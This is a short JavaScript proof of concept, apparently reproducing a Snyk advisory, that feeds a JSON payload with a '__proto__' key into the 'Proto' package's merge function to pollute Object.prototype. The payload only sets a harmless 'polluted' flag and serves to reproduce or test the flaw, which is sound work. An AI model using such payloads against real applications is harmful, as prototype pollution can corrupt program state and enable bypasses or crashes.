//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
 
  const proto = require("Proto");
  let payload = '{"__proto__":{"polluted":"yes"}}';

   

  proto.merge({}, JSON.parse(payload));
// End of file
